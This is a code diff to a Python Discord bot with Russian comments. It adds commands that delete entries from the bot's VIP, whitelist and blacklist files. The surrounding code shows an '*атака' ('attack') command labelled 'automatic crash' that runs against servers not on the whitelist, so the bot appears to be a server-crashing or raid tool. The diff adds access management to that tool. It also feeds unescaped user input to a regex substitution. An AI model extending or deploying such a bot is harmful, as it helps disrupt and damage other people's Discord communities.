@@ -2,6 +2,7 @@ import discord
 import asyncio
 from discord.ext import commands
 import os
+import re
 token = os.environ.get('TOKENZ') #токен
 from discord_webhook import DiscordWebhook
 print('Ожидание входа...')
@@ -93,6 +94,39 @@ class MyClient(discord.Client):
 				f.write(mc + '\n')
 				await message.author.send(':white_check_mark:')
 				f.close()
+				
+			if message.content.startswith('*delvip'):
+				await message.delete()
+				mc = message.content.replace('*delvip', '')
+				with open('vip.txt', 'r+') as f:
+					text = f.read()
+					text = re.sub(str(mc), '', text)
+					f.seek(0)
+					f.write(text)
+					f.truncate()
+				await message.author.send(':white_check_mark:')
+				
+			if message.content.startswith('*delwl'):
+				await message.delete()
+				mc = message.content.replace('*delwl', '')
+				with open('whitelist.txt', 'r+') as f:
+					text = f.read()
+					text = re.sub(str(mc), '', text)
+					f.seek(0)
+					f.write(text)
+					f.truncate()
+				await message.author.send(':white_check_mark:')
+				
+			if message.content.startswith('*delbl'):
+				await message.delete()
+				mc = message.content.replace('*delbl', '')
+				with open('blacklist.txt', 'r+') as f:
+					text = f.read()
+					text = re.sub(str(mc), '', text)
+					f.seek(0)
+					f.write(text)
+					f.truncate()
+				await message.author.send(':white_check_mark:')
 		if white.find(str(message.guild.id)) == -1 and black.find(str(message.author.id)) == -1:
 			if message.content == '*атака': #автоматический краш
 				await message.delete() #удаление сообщения
